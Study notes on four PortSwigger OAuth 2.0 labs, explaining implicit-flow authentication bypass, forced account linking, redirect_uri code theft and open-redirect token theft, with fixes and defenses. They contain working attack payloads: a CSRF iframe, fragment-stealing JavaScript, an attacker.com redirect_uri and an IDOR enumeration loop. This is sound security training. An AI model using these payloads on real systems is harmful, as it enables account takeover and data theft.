# Day 31 Notes — OAuth 2.0 Flaws

## 1. What We Did Today Overview

- Studied **OAuth 2.0 authentication flaws** on PortSwigger Web Security Academy
- Used **Burp Suite** (Proxy, HTTP History, Repeater, Exploit Server) as primary tools
- Completed **Lab 1 — Authentication bypass via OAuth implicit flow** — zero hints
- Completed **Lab 2 — Forced OAuth profile linking** — zero hints
- Completed **Lab 3 — OAuth account hijacking via redirect_uri** — zero hints
- Completed **Lab 4 — Stealing OAuth access tokens via open redirect** — hint used on chaining the open redirect with redirect_uri
- Successfully impersonated carlos, hijacked OAuth linking, stole authorization codes, and chained open redirect with OAuth token theft

---

## 2. The Foundation — Why This Vulnerability Exists

### Part A — Root Cause

OAuth 2.0 is not an authentication protocol — it is an **authorization delegation protocol**. It was designed to answer one question: *"Can this application access my data on another service?"* It was never designed to answer: *"Is this person who they claim to be?"* When developers use OAuth to handle login — which almost every modern application does — they are using a delegation protocol to solve an identity problem. That mismatch is where most OAuth vulnerabilities are born.

The developer building an OAuth login made a reasonable assumption: if Google (or any trusted identity provider) gives me a token confirming this user approved access, I can trust that token to establish who the user is. The flaw is in how loosely that trust is implemented. Developers assume the token proves identity when it only proves delegation. They assume the redirect will always go to the right place. They assume the state parameter is optional because it seems like an extra step. Every one of these assumptions is an attack surface.

There is a second root cause specific to OAuth's complexity. The protocol involves three parties (the user, the client application, and the authorization server), multiple HTTP redirects, two different token types, and several different flow variants. Each transition between parties is a potential interception point. Each parameter in each redirect is attacker-controllable. Most developers implement OAuth by copying example code from documentation without deeply understanding what each parameter is defending against. When they skip the state parameter or trust redirect_uri loosely, they don't realize they've removed a critical security control.

### Part B — The Mental Model

Imagine a nightclub that uses a VIP pass system run by a third party — a well-known ticketing company. The system works like this: you go to the ticketing company's website, log in, and authorize the nightclub to know your age and membership status. The ticketing company gives the nightclub a sealed envelope containing your details. The nightclub opens the envelope and lets you in based on what's inside.

**Lab 1 (implicit flow)** is the nightclub accepting a forged envelope. The ticketing company gave you a legitimate envelope for yourself, but the nightclub doesn't check whose name is on the envelope — it just reads whatever name you write on the outside. You write carlos's name on your envelope and walk in as carlos.

**Lab 2 (missing state)** is someone else's envelope being delivered to your door because there's no return address verification. The attacker starts the process of getting an envelope addressed to the victim's account, then tricks the victim's browser into completing the delivery. The envelope ends up linking the attacker's identity to the victim's account.

**Lab 3 (redirect_uri)** is the nightclub's envelope — containing your authorization code — being delivered to the wrong address because the ticketing company didn't verify the delivery address carefully. The attacker changed the delivery address to their own, received the envelope, opened it, and used the code inside to impersonate the victim.

**Lab 4 (open redirect chain)** is the delivery address passing a basic check (it starts with the right street name) but secretly forwarding all mail to the attacker's address. The ticketing company sees a legitimate-looking delivery address; the mail ends up somewhere else entirely.

### Part C — Three Conditions Required for Exploitation

**Condition 1:** The application uses OAuth for authentication (login), not merely for authorization (accessing a specific API resource). OAuth authentication bypass requires that the server uses token or code exchange to establish user identity and create a session.

**Condition 2:** At least one validation step is missing or weak — signature verification of the token's claimed identity (Lab 1), the state parameter for CSRF protection (Lab 2), strict redirect_uri validation (Labs 3 and 4), or the combination of redirect_uri validation and absence of open redirects in the client application (Lab 4).

**Condition 3:** The attacker can either intercept traffic via Burp (for manual exploitation in a lab context) or deliver a crafted URL to a victim whose browser will make the OAuth request on their behalf (for real-world exploitation of Labs 2, 3, and 4).

### Part D — What OAuth Attacks Can and Cannot Do

**OAuth attacks CAN:**
- Log in as any user whose email or username is known, without their password (Lab 1)
- Link the attacker's social account to the victim's existing account, enabling future login as the victim (Lab 2)
- Steal authorization codes and exchange them for access tokens representing the victim (Lab 3)
- Steal access tokens directly by chaining with open redirects in the client application (Lab 4)
- Achieve full account takeover without ever knowing the victim's credentials

**OAuth attacks CANNOT:**
- Extract the victim's password from the identity provider (Google, Facebook, etc.) — OAuth never exposes passwords
- Work if the authorization server enforces strict redirect_uri validation AND the client application has no open redirects
- Bypass the consent screen if the victim has never previously authorized the client application (some labs auto-grant consent for returning users)
- Work without access to the OAuth flow — these attacks require either Burp interception or a victim whose browser makes the requests

---

## 3. Lab 1 — Authentication Bypass via OAuth Implicit Flow

### The Setup

The application uses the **OAuth implicit flow** for login. In the implicit flow, the authorization server returns the access token directly in the URL fragment after the user consents — there is no intermediate authorization code exchange. The client-side JavaScript reads the token from the fragment and sends it to the backend via a POST request to `/authenticate`. The backend is supposed to verify the token with the authorization server and confirm which user it belongs to before creating a session.

### The Authorization Request Captured in Burp

```http
GET /auth?client_id=o6tybztm7e38c2yrywrqy
    &redirect_uri=https://0a70009104355e6481380cc200de0070.web-security-academy.net/oauth-callback
    &response_type=token
    &nonce=-1775596761
    &scope=openid%20profile%20email HTTP/2
```

Key observations from this request:

`response_type=token` confirms this is the **implicit flow** — the server will return a token directly, not an authorization code. In the authorization code flow this would be `response_type=code`. The implicit flow is considered less secure precisely because the token is exposed in the browser URL and handled by client-side JavaScript before the backend ever sees it.

`scope=openid%20profile%20email` requests the user's identity information — this is OpenID Connect layered on top of OAuth, which is how OAuth gets used for login rather than just resource access.

### The Authentication POST Request

After the implicit flow completed and JavaScript read the token from the URL fragment, the following request was sent to the backend:

```http
POST /authenticate HTTP/2
Host: 0a70009104355e6481380cc200de0070.web-security-academy.net
Cookie: session=fqgcXWE1KM1YUav1mElrFWBAD5k3HFpZ
Content-Type: application/json
Content-Length: 111

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"uNonwrSjfCL2FxnA-XTFauq5cVPSJOtbymMEGEjmpjN"}
```

This request was sent to Burp Repeater. The `email` and `username` fields were changed from `wiener`'s details to `carlos@carlos-montoya.net` and `carlos`. The `token` value was kept unchanged — it is a valid access token obtained from a legitimate login as wiener.

### The Output and How the Lab Was Solved

The server returned a response containing a new session. Using Burp's **"Show response in browser"** option opened the response in the actual browser, which applied the session cookie from the response. This logged the browser in as carlos without ever knowing carlos's password or having access to carlos's token.

### Why It Worked — Technical Explanation

The backend received a POST with three fields: `email`, `username`, and `token`. A correctly implemented server would:

1. Take the `token` value
2. Call the OAuth provider's userinfo endpoint (`GET /userinfo` with `Authorization: Bearer token`)
3. Receive back the actual identity associated with that token
4. Compare that identity to the `email` field in the POST body
5. Only create a session if they match

This server skips steps 2 through 4 entirely. It reads the `email` field from the POST body and creates a session for that email without verifying that the token actually belongs to that email. The token is valid (issued for wiener's login), so the server accepts it. But the server never asks: *"Does this token belong to carlos?"* It just trusts the email field.

The attacker provided a legitimate token paired with a different user's email. The server accepted the token as proof of a valid OAuth login and accepted the email as proof of identity — without ever connecting the two.

### What This Proves

This confirms the server makes login decisions based on attacker-controlled POST body fields without verifying token ownership against the authorization server.

---

## 4. Lab 2 — Forced OAuth Profile Linking via Missing State Parameter

### The Setup

This application allows users to link their social media account to an existing username/password account. The linking process uses OAuth. An attacker who can steal or intercept the OAuth linking URL (which contains the authorization code) can deliver that URL to a victim. Because there is no `state` parameter, there is no CSRF protection — the victim's browser will complete the linking, attaching the attacker's social identity to the victim's account.

### The Payload Used

```html
<iframe src="https://0a8c00ce046a6e14828824b600fd00eb.web-security-academy.net/oauth-linking?code=QDSAxFWq00wncQ756rcEU1sWTKlGaTn3csVpps7ol3l"></iframe>
```

This iframe was hosted on the exploit server and delivered to the admin/victim. When the victim's browser loaded this page, the iframe silently made a GET request to `/oauth-linking?code=...` using the victim's existing session cookie. The server processed this as: *"The currently logged-in user wants to link the social account associated with this code."* The victim's account was linked to the attacker's social identity.

### Why It Worked — Technical Explanation

The OAuth linking flow works as follows in a correctly implemented system:

```
1. User clicks "Link social account"
2. Client generates a random state value, stores it in session
3. Client redirects to authorization server with state parameter
4. User approves on authorization server
5. Authorization server redirects back to /oauth-linking?code=X&state=Y
6. Client checks: does Y match the state stored in step 2?
7. If yes — complete the linking
8. If no — reject (CSRF attempt detected)
```

In this lab, steps 2, 5 (state part), and 6 are missing. There is no state parameter generated, sent, or checked. This means any browser that visits `/oauth-linking?code=X` will complete the linking for whoever is currently logged in — regardless of whether that person initiated the OAuth flow.

The attacker initiated an OAuth flow as themselves, intercepted the redirect to `/oauth-linking?code=X` before it completed (by dropping the request in Burp), and delivered that URL to the victim via the iframe. The victim's browser visited the URL. The victim's session cookie was sent with the request. The server linked the attacker's social account (represented by the code) to the victim's currently logged-in account.

After this, the attacker used their own social account credentials to log in via OAuth — and landed inside the victim's (admin's) account.

### What This Proves

This confirms the OAuth linking endpoint has no CSRF protection — any browser with a valid session can be tricked into completing an account linking operation it never initiated.

---

## 5. Lab 3 — OAuth Account Hijacking via redirect_uri Manipulation

### The Setup

The OAuth flow sends an authorization code to the `redirect_uri` specified in the authorization request. The authorization server is supposed to only allow pre-registered URIs. In this lab, the validation is weak — the server accepts arbitrary redirect URIs. An attacker who can make the victim's browser initiate an OAuth flow with a manipulated `redirect_uri` will receive the victim's authorization code at their server.

### The Authorization Code Stolen

```
https://0a74007a03f9aa4b80cd03c9004100e1.web-security-academy.net/oauth-callback?code=CCj2HkSLg9KIgVpLfULNVaCKrCcMds_Vc7w0QKSCLZd
```

This URL was captured — it shows the authorization code `CCj2HkSLg9KIgVpLfULNVaCKrCcMds_Vc7w0QKSCLZd` being delivered to the callback endpoint. In the actual attack, this code would be delivered to the attacker's server instead of the legitimate callback.

### Steps Performed

1. Logged in via OAuth and studied the full flow in **Burp HTTP History**
2. Located the authorization request: `GET /auth?client_id=...&redirect_uri=https://client-app.com/oauth-callback&response_type=code&...`
3. Sent this request to **Burp Repeater** and changed `redirect_uri` to the exploit server URL
4. The authorization server accepted the modified URI — confirming weak validation
5. Created a page on the exploit server that redirected the victim's browser to the OAuth authorization endpoint with the manipulated `redirect_uri`
6. Delivered the exploit to the victim — their browser followed the OAuth flow, auto-granted consent (they had previously authorized the app), and the authorization code was sent to the exploit server
7. Retrieved the code from the exploit server access log
8. Used the code directly — navigated to `/oauth-callback?code=CCj2HkSLg9KIgVpLfULNVaCKrCcMds_Vc7w0QKSCLZd` — the application exchanged the code for a token and logged in as the victim

### Why It Worked — Technical Explanation

The authorization code is a single-use credential that proves the user approved the OAuth flow. The authorization server generates it and delivers it to the `redirect_uri`. The client application's backend then exchanges it for an access token by presenting the code along with its `client_secret`.

The critical assumption is that only the legitimate client application can receive the code — because only pre-registered redirect URIs are allowed. When that validation is absent, the attacker controls where the code is delivered. The attacker cannot use the code without the `client_secret` in most flows — but the lab's application backend exchanges the code automatically when the attacker navigates to the callback URL, because the backend holds the client secret and performs the exchange server-side.

The attacker never needed the client secret directly. They needed only to deliver the code to the legitimate callback endpoint — because the legitimate application would then exchange it and create a session for whoever the code represented (the victim).

### What This Proves

This confirms that weak `redirect_uri` validation allows the authorization code to be stolen and used to authenticate as the victim, leveraging the legitimate application's own backend to complete the token exchange.

---

## 6. Lab 4 — Stealing OAuth Access Tokens via Open Redirect (Steps + Explanation)

### The Setup

This lab has stricter `redirect_uri` validation than Lab 3 — it only accepts URIs within the client application's own domain. However, the client application itself contains an open redirect vulnerability. The attacker chains these two facts: use the open redirect within the allowed domain as the `redirect_uri`, then have the open redirect forward the token to an attacker-controlled server.

### Steps Performed

**Step 1 — Confirm strict redirect_uri validation**

Attempted to change `redirect_uri` to the exploit server directly (as in Lab 3). The authorization server rejected it with an error. This confirmed some validation is present — arbitrary external URIs are not accepted.

**Step 2 — Find the open redirect in the client application**

Browsed the client application looking for redirect parameters. Found that blog post pages use a `next` parameter:
```
GET /post/next?path=/post?postId=1
```
Tested whether this parameter accepts external URLs:
```
GET /post/next?path=https://exploit-server.net/exploit
```
The application redirected to the external URL — confirming an open redirect exists within the client domain.

**Step 3 — Craft the chained redirect_uri**

Built a `redirect_uri` that passes the domain check (it is on the client application's domain) but uses the open redirect to forward the token externally:
```
redirect_uri=https://client-app.com/post/next?path=https://exploit-server.net/exploit
```
Tested this in Burp Repeater — the authorization server accepted it because the URI starts with the allowed client domain.

**Step 4 — Understand why the fragment matters**

In the implicit flow (`response_type=token`), the access token is appended to the redirect URI as a **URL fragment** (`#access_token=...`). URL fragments are not sent to servers in HTTP requests — they stay in the browser. This means the exploit server's access log will NOT capture the token directly.

To steal the fragment, the exploit server must serve a JavaScript page that reads `window.location.hash` (which contains the fragment) and sends it to the server explicitly.

**Step 5 — Create the exploit page**

On the exploit server, created a page with the following JavaScript:

```javascript
<script>
    // The access token arrives in the URL fragment after the redirect chain
    // window.location.hash contains everything after the # symbol
    // Send it to our server as a query parameter (query params DO reach the server)
    window.location = '/?'+document.location.hash.substr(1);
</script>
```

`document.location.hash` reads the fragment (`#access_token=xyz&token_type=Bearer&...`). `.substr(1)` removes the leading `#`. The script redirects to the exploit server's root with the fragment contents appended as query parameters — which DO appear in server logs.

**Step 6 — Build the full exploit URL**

The exploit page on the exploit server needed to initiate the OAuth flow with the manipulated `redirect_uri`:

```
https://AUTH-SERVER/auth
    ?client_id=CLIENT_ID
    &redirect_uri=https://client-app.com/post/next?path=https://exploit-server.net/exploit
    &response_type=token
    &nonce=RANDOM
    &scope=openid%20profile%20email
```

**Step 7 — Deliver to victim**

Set the exploit server's body to redirect the victim's browser to the full OAuth URL above. Used "Deliver to victim." The victim's browser:

1. Visited the exploit page → redirected to OAuth authorization endpoint
2. Auto-granted consent (previously authorized app)
3. Authorization server redirected to `https://client-app.com/post/next?path=https://exploit-server.net/exploit#access_token=VICTIM_TOKEN&...`
4. Client application's open redirect forwarded the browser to `https://exploit-server.net/exploit#access_token=VICTIM_TOKEN&...`
5. Exploit server's JavaScript ran, read the fragment, redirected to `https://exploit-server.net/?access_token=VICTIM_TOKEN&...`
6. Token appeared in exploit server access log as a query parameter

**Step 8 — Use the token**

Retrieved the access token from the exploit server log. Used it to call the OAuth provider's `/me` endpoint to get the victim's profile data, then used the profile data to log in as the victim.

### Why It Worked — The Chain Explained

Neither vulnerability alone was sufficient:

- The open redirect alone would not steal OAuth tokens — it requires the OAuth flow to deliver a token to the redirect target
- The weak redirect_uri validation alone would not work — the authorization server checked the domain

Together: the authorization server checked only that the `redirect_uri` was on the client domain (which it was). The client domain's open redirect then forwarded the token to the attacker. The fragment handling required JavaScript because server logs don't capture URL fragments — a subtle but critical implementation detail that most developers and many security testers miss.

### What This Proves

This confirms that OAuth security cannot be evaluated in isolation. A strict `redirect_uri` check combined with any open redirect on the client domain is equivalent to no `redirect_uri` check at all.

---

## 7. What Failed and Why

No failures in Labs 1, 2, or 3 — all solved independently.

**Lab 4 — hint used for the open redirect chain**

The specific point of confusion was understanding that `redirect_uri` validation being strict did not mean the attack was impossible — it meant the attack vector shifted from external redirect to internal redirect + open redirect chain. The hint clarified that the open redirect within the client application's domain could be used as the `redirect_uri` value. This is a non-obvious insight because it requires thinking across two separate vulnerability classes simultaneously.

What this teaches: when a direct attack vector is blocked, the question is never "is it impossible?" but "what does the application trust that I can abuse?" The authorization server trusted the client domain. The client domain had an open redirect. The chain was the answer.

---

## 8. Chain Thinking

### The Chain

```
OAuth redirect_uri manipulation (Lab 3)
        ↓
Authorization code stolen — delivered to attacker's server
        ↓
Attacker navigates to legitimate /oauth-callback?code=STOLEN_CODE
        ↓
Application backend exchanges code for access token (using its own client_secret)
        ↓
Session created for the victim — attacker is now logged in as victim
        ↓
Chain with IDOR: use victim session to access victim's private data
via predictable resource IDs
        ↓
Full account takeover + data exfiltration
```

### Severity Upgrade

OAuth account hijacking via `redirect_uri` alone is **Critical** — it produces a valid session for the victim account. Adding IDOR converts this into a data breach affecting not just the target account but any account whose resource IDs are predictable (sequential integers, guessable UUIDs, email addresses).

Real-world scenario: an e-commerce platform uses OAuth for login. The attacker hijacks the OAuth flow for a customer service representative account. The customer service panel shows all customer orders via `/api/orders?user_id=X`. The attacker uses IDOR to enumerate thousands of customer records — order history, shipping addresses, payment method last four digits.

### Combined Attack Code Pattern

```javascript
// Step 1: Craft the malicious authorization URL
// (attacker sets this as their exploit page redirect)
const authUrl = new URL('https://auth-server.com/oauth/authorize');
authUrl.searchParams.set('client_id', 'TARGET_CLIENT_ID');
authUrl.searchParams.set('redirect_uri', 'https://attacker.com/steal'); // weak validation
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('scope', 'openid profile email');
// No state parameter — CSRF possible on top

// Step 2: Victim's browser visits the exploit page, gets redirected to authUrl
// Authorization server auto-grants consent (returning user)
// Code delivered to attacker's server: GET /steal?code=STOLEN_CODE

// Step 3: Attacker uses the code by navigating to the legitimate callback
// The legitimate backend exchanges the code using its own client_secret
const callbackUrl = `https://client-app.com/oauth-callback?code=${stolenCode}`;
// Navigating to this URL logs the attacker in as the victim

// Step 4: IDOR enumeration using the victim session
async function enumerateUsers(sessionCookie) {
    const results = [];
    for (let userId = 1; userId <= 10000; userId++) {
        const res = await fetch(`/api/user/${userId}/profile`, {
            headers: { 'Cookie': `session=${sessionCookie}` }
        });
        if (res.ok) {
            results.push(await res.json());
        }
    }
    return results;
}
```

---

## 9. Real World Context

In 2012, researcher Egor Homakov disclosed an OAuth CSRF vulnerability in GitHub that allowed account takeover via the missing state parameter — identical to Lab 2. GitHub patched it within hours of disclosure, but the vulnerability had existed in production since OAuth was implemented. The impact was account takeover for any GitHub user who clicked a crafted link.

OAuth `redirect_uri` vulnerabilities have been found in major identity providers including Facebook, Microsoft, and several large SaaS platforms. Bug bounty payouts for OAuth account takeover vulnerabilities on HackerOne range from **$5,000 to $50,000** depending on the platform's scope and the impact of the takeover. On high-value targets (financial services, healthcare, enterprise SaaS), payouts at the high end are common because account takeover directly translates to data breach liability.

OAuth vulnerabilities remain common for two reasons. First, the specification has multiple flow variants (authorization code, implicit, client credentials, device flow) and developers frequently implement the wrong one for their use case or mix elements across flows. Second, OAuth is almost always implemented using third-party libraries, and developers trust the library to handle security without reading what validations the library does and does not perform by default. The state parameter, for example, is optional in the OAuth spec — libraries don't enforce it automatically.

---

## 10. The Fix

### Vulnerable Pattern — Missing State Parameter

```javascript
// VULNERABLE — no state parameter generated or validated
app.get('/oauth-start', (req, res) => {
    const authUrl = `https://auth-server.com/oauth/authorize
        ?client_id=${CLIENT_ID}
        &redirect_uri=${REDIRECT_URI}
        &response_type=code
        &scope=openid profile email`;
    // No state — CSRF on OAuth is now possible
    res.redirect(authUrl);
});

app.get('/oauth-callback', async (req, res) => {
    const { code } = req.query;
    // No state validation — accepts any code from any OAuth flow
    const tokens = await exchangeCode(code);
    loginUser(res, tokens);
});
```

### Fixed Code

```javascript
const crypto = require('crypto');

app.get('/oauth-start', (req, res) => {
    // Generate cryptographically random state value
    const state = crypto.randomBytes(32).toString('hex');

    // Store state in server-side session — not a cookie the attacker can set
    req.session.oauthState = state;

    const authUrl = new URL('https://auth-server.com/oauth/authorize');
    authUrl.searchParams.set('client_id', CLIENT_ID);
    authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
    authUrl.searchParams.set('response_type', 'code');
    authUrl.searchParams.set('scope', 'openid profile email');
    authUrl.searchParams.set('state', state); // include state

    res.redirect(authUrl.toString());
});

app.get('/oauth-callback', async (req, res) => {
    const { code, state } = req.query;

    // Verify state matches what we stored — prevents CSRF
    if (!state || state !== req.session.oauthState) {
        return res.status(403).send('Invalid state parameter — possible CSRF attack');
    }

    // Clear the state to prevent replay
    delete req.session.oauthState;

    // Exchange code for tokens
    const tokens = await exchangeCode(code);

    // Verify token identity against authorization server — prevents Lab 1 attack
    const userInfo = await fetch('https://auth-server.com/userinfo', {
        headers: { Authorization: `Bearer ${tokens.access_token}` }
    }).then(r => r.json());

    // Use identity from the authorization server — not from POST body
    loginUser(res, userInfo.email);
});
```

### Why the Fix Works

The state parameter works because it is generated server-side, stored in the server-side session, and must be echoed back by the authorization server in the callback. An attacker who crafts a `/oauth-callback?code=X` URL cannot know the state value stored in the victim's session — that value is never exposed to the attacker. If the state is missing or wrong, the server rejects the request before any token exchange occurs.

The userinfo verification fix works because the server no longer trusts any attacker-controlled input for identity. The identity comes directly from the authorization server's API in response to the access token — the only way to get a correct response is to have a valid token that belongs to the user.

### Defense in Depth

**Strict redirect_uri registration and exact-match validation:** Register specific full URIs (not just domains or path prefixes) and reject any authorization request where `redirect_uri` does not exactly match a registered value. Partial matching (checking only the domain) is insufficient.

**Eliminate open redirects in the client application:** Any open redirect on the client application's domain undermines `redirect_uri` validation. Audit all URL parameters that perform redirects and restrict them to a whitelist of internal paths.

**Use the authorization code flow, not the implicit flow:** The implicit flow exposes tokens in URLs and browser history. The authorization code flow keeps tokens server-side. The OAuth 2.0 Security Best Current Practice document explicitly recommends against the implicit flow for all new implementations.

**Enforce short token lifetimes and one-time-use authorization codes:** Authorization codes should expire within 60 seconds and be invalidated after first use. Access tokens should expire within 15–60 minutes. This limits the window for stolen code or token exploitation.

### What Does NOT Fix It

Validating the `Content-Type` header on the `/authenticate` POST does not fix Lab 1 — the attacker sends a valid `application/json` request with a valid token; the content type is correct, the content is malicious.

Adding rate limiting to the OAuth callback endpoint does not fix redirect_uri manipulation — the attack requires only one request from the victim's browser.

Using HTTPS does not prevent any of these attacks — all four exploit the logic of the OAuth flow, not the confidentiality of the transport. The tokens and codes are visible to the attacker through redirect URLs and server logs, not through network interception.

---

## 11. Key Concepts Summary

| Term | Meaning |
|------|---------|
| **OAuth 2.0** | A protocol that lets one application access a user's data on another service, with the user's permission, without sharing their password |
| **Authorization Server** | The trusted third party (Google, Facebook, GitHub) that authenticates the user and issues tokens |
| **Client Application** | The app that wants access to the user's data — the one implementing the "Login with Google" button |
| **Resource Owner** | The user — the person who owns the data and grants or denies permission |
| **Authorization Code** | A short-lived, single-use code issued by the authorization server after the user consents — exchanged by the backend for an access token |
| **Access Token** | A credential that allows the client application to access the user's data on the authorization server |
| **Implicit Flow** | An OAuth flow variant where the access token is returned directly in the URL instead of via a code exchange — considered insecure for most use cases |
| **Authorization Code Flow** | The recommended OAuth flow where an intermediate code is exchanged server-side for tokens, keeping tokens out of the browser URL |
| **redirect_uri** | The URL the authorization server sends the user back to after they approve or deny access — must be validated strictly to prevent code theft |
| **state parameter** | A random value the client sends with the authorization request and must receive back unchanged — prevents CSRF attacks on the OAuth flow |
| **CSRF on OAuth** | An attack where the victim's browser is tricked into completing an OAuth flow the attacker initiated — only possible when the state parameter is missing |
| **Open Redirect** | A vulnerability where a URL parameter controls where the application redirects the user — dangerous when chained with OAuth redirect_uri validation |
| **Account Linking** | A feature that connects a social login to an existing username/password account — requires re-authentication and CSRF protection to be safe |
| **Show Response in Browser** | A Burp Suite feature that opens a server response in the actual browser, applying any session cookies contained in the response |
| **URL Fragment** | The part of a URL after the `#` symbol — not sent to servers in HTTP requests, only accessible to JavaScript via `window.location.hash` |
| **Token Ownership Verification** | The server-side step of calling the authorization server's userinfo endpoint to confirm which user an access token belongs to — absent in Lab 1 |

---

## 12. Payloads and Commands Reference

```http
-- Lab 1 — Implicit flow authorization request (observed in Burp) --
GET /auth?client_id=o6tybztm7e38c2yrywrqy
    &redirect_uri=https://TARGET.web-security-academy.net/oauth-callback
    &response_type=token
    &nonce=-1775596761
    &scope=openid%20profile%20email HTTP/2
```

```http
-- Lab 1 — Modified POST /authenticate (changed email+username to target user) --
POST /authenticate HTTP/2
Host: 0a70009104355e6481380cc200de0070.web-security-academy.net
Content-Type: application/json

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"uNonwrSjfCL2FxnA-XTFauq5cVPSJOtbymMEGEjmpjN"}

-- After sending: use Burp "Show response in browser" to apply the session cookie --
```

```html
<!-- Lab 2 — CSRF iframe payload hosted on exploit server -->
<!-- Victim's browser silently visits the oauth-linking URL using victim's session -->
<iframe src="https://TARGET.web-security-academy.net/oauth-linking?code=QDSAxFWq00wncQ756rcEU1sWTKlGaTn3csVpps7ol3l"></iframe>
```

```
-- Lab 3 — Stolen authorization code delivered to legitimate callback --
https://TARGET.web-security-academy.net/oauth-callback?code=CCj2HkSLg9KIgVpLfULNVaCKrCcMds_Vc7w0QKSCLZd

-- Navigate to this URL to have the application exchange the code and log in as victim --
```

```
-- Lab 3 — Modified redirect_uri in Burp Repeater --
Original:  redirect_uri=https://client-app.com/oauth-callback
Modified:  redirect_uri=https://EXPLOIT-SERVER.exploit-server.net/exploit
```

```javascript
// Lab 4 — Exploit server page JavaScript (steals token from URL fragment)
// Fragments (#access_token=...) are not sent to servers — must use JS to extract
window.location = '/?' + document.location.hash.substr(1);
// .substr(1) removes the leading # character
// Appending as query params (?) means the token appears in server access logs
```

```
-- Lab 4 — Chained redirect_uri using open redirect --
redirect_uri=https://client-app.com/post/next?path=https://EXPLOIT-SERVER.net/exploit

-- This passes domain validation (starts with client-app.com) --
-- The open redirect at /post/next?path= forwards to exploit server --
-- Token fragment travels through the redirect chain to the exploit page --
```

```
-- General OAuth flow investigation steps in Burp --
1. Proxy > HTTP History > filter by the OAuth domain (usually separate from the app)
2. Look for: GET /auth?client_id=... (authorization request)
3. Look for: GET /oauth-callback?code=... (code delivery)
4. Look for: POST /authenticate or POST /login (backend token/code use)
5. Send authorization request to Repeater — test redirect_uri manipulation
6. Check for state parameter — if absent, CSRF is possible
7. Check POST body — if it contains email/username fields, test Lab 1 pattern
```

---

## 13. Foundation Checklist

**Can you explain why OAuth is vulnerable to these attacks — not what the attacks are, but what design decisions or omissions create the attack surface?**
OAuth delegates trust across multiple parties through browser redirects. Each redirect passes sensitive credentials (codes, tokens) through the browser, which is attacker-accessible. When the parameters controlling those redirects (redirect_uri, state) are not validated strictly, or when the receiving server trusts attacker-controlled fields (email in POST body) over authoritative server responses, the delegation chain is broken.

**Can you perform an OAuth implicit flow bypass manually in Burp without any automated tools?**
Yes — intercept the POST /authenticate request, change the email and username fields to the target user, send it, then use "Show response in browser" to apply the returned session cookie. The entire attack is one request modification in Repeater.

**Can you explain the difference between the implicit flow and the authorization code flow to a developer, and why the implicit flow is more dangerous?**
In the authorization code flow, the access token is exchanged server-to-server — the browser never sees the token, only the short-lived code. In the implicit flow, the token is placed in the browser URL fragment, accessible to JavaScript and visible in browser history. Any JavaScript running on the page, any browser extension, or any open redirect can potentially read and exfiltrate it. The code flow limits the token's exposure to two trusted servers; the implicit flow exposes it to the entire browser environment.

**Can you describe what the state parameter prevents and what happens when it is absent?**
The state parameter prevents CSRF on the OAuth flow. Without it, an attacker can initiate an OAuth flow, capture the resulting code or linking URL, and deliver it to a victim whose browser will complete the flow — linking the attacker's identity to the victim's account, or completing an OAuth login as the attacker within the victim's browser context. The state ties the callback to a specific session that initiated the flow.

**Can you chain OAuth account takeover with another vulnerability and explain the combined impact?**
OAuth redirect_uri theft (Lab 3) combined with IDOR: steal the victim's authorization code, use it to log in as the victim, then use the victim's session to enumerate other users' private resources via IDOR on predictable resource IDs. OAuth alone gives access to one account. IDOR alone requires guessing IDs with limited access. Combined, they produce authenticated access to all users' data.

**Can you explain why fixing redirect_uri validation alone is not sufficient and what additional controls are needed?**
Strict redirect_uri validation is defeated if the client application has any open redirect vulnerability (Lab 4). The authorization server checks the domain; the open redirect forwards the token externally. A complete defense requires: strict exact-match redirect_uri validation, elimination of open redirects on the client domain, mandatory state parameter validation, token ownership verification against the authorization server's userinfo endpoint, and use of the authorization code flow rather than the implicit flow.

---

